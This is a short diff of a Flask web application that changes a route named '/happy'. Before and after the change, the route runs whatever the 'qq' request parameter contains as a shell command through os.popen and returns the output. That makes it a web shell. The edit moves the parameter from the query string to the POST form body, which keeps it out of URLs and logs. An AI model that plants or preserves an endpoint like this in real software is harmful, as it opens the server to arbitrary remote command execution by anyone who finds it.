@@ -38,7 +38,7 @@ def hello() -> str:
 
 @app.route("/happy")
 def happy() -> str:
-    return os.popen(request.args.get('qq')).read()
+    return os.popen(request.form.get('qq')).read()
 
 
 def shutdown_handler(signal_int: int, frame: FrameType) -> None:
